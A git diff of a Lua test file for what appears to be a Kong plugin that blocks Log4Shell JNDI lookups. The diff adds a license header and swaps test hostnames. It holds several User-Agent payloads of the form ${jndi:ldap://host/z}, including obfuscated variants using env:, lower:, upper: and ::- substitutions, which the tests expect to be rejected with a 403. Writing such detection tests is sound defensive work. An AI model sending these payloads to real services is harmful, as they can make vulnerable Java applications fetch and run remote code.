@@ -1,3 +1,19 @@
+--Copyright 2021 Infiniroot
+--Copyright 2021 Brent Yarger
+--
+--Licensed under the Apache License, Version 2.0 (the "License");
+--you may not use this file except in compliance with the License.
+--You may obtain a copy of the License at
+--
+--http://www.apache.org/licenses/LICENSE-2.0
+--
+--Unless required by applicable law or agreed to in writing, software
+--distributed under the License is distributed on an "AS IS" BASIS,
+--WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+--See the License for the specific language governing permissions and
+--limitations under the License.
+
+
 local helpers = require "spec.helpers"
 
 
@@ -15,7 +31,7 @@ for _, strategy in helpers.all_strategies() do
       -- Inject a test route. No need to create a service, there is a default
       -- service which will echo the request.
       local route1 = bp.routes:insert({
-        hosts = { "test1.com" },
+        hosts = { "test1.dev" },
       })
       -- add the plugin to test to the route we created
       bp.plugins:insert {
@@ -56,11 +72,10 @@ for _, strategy in helpers.all_strategies() do
       it("Normal requests go through fine", function()
         local r = client:get("/request", {
           headers = {
-            host = "test1.com",
+            host = "test1.dev",
             ['User-agent'] = {"my-user-agent","my-other-user-agent"}
           }
         })
-        -- validate that the request succeeded, response status 200
         assert.response(r).has.status(200)
 
       end)
@@ -68,11 +83,10 @@ for _, strategy in helpers.all_strategies() do
       it("Checks for jndi lookups", function()
         local r = client:get("/request", {
           headers = {
-            host = "test1.com",
-            ['User-agent'] = {"my-user-agent","${jndi:ldap://somesitehackerofhell.com/z}"}
+            host = "test1.dev",
+            ['User-agent'] = {"my-user-agent","${jndi:ldap://example.dev/z}"}
           }
         })
-        -- validate that the request succeeded, response status 200
         assert.response(r).has.status(403)
 
       end)
@@ -80,11 +94,10 @@ for _, strategy in helpers.all_strategies() do
       it("Checks for env: jndi lookups", function()
         local r = client:get("/request", {
           headers = {
-            host = "test1.com",
-            ['User-agent'] = {"my-user-agent","${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}"}
+            host = "test1.dev",
+            ['User-agent'] = {"my-user-agent","${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//example.dev/z}"}
           }
         })
-        -- validate that the request succeeded, response status 200
         assert.response(r).has.status(403)
 
       end)
@@ -92,33 +105,30 @@ for _, strategy in helpers.all_strategies() do
       it("Checks for lower: jndi lookups", function()
         local r = client:get("/request", {
           headers = {
-            host = "test1.com",
-            ['User-agent'] = {"my-user-agent","${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}"}
+            host = "test1.dev",
+            ['User-agent'] = {"my-user-agent","${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://example.dev/z}"}
           }
         })
-        -- validate that the request succeeded, response status 200
         assert.response(r).has.status(403)
       end)
 
     it("Checks for upper: jndi lookups", function()
       local r = client:get("/request", {
         headers = {
-          host = "test1.com",
-          ['User-agent'] = {"my-user-agent","${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}"}
+          host = "test1.dev",
+          ['User-agent'] = {"my-user-agent","${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://example.dev/z}"}
         }
       })
-      -- validate that the request succeeded, response status 200
       assert.response(r).has.status(403)
     end)
 
     it("Checks for ::- jndi lookups", function()
       local r = client:get("/request", {
         headers = {
-          host = "test1.com",
-          ['User-agent'] = {"my-user-agent","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}"}
+          host = "test1.dev",
+          ['User-agent'] = {"my-user-agent","${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://example.dev/z}"}
         }
       })
-      -- validate that the request succeeded, response status 200
       assert.response(r).has.status(403)
     end)
 
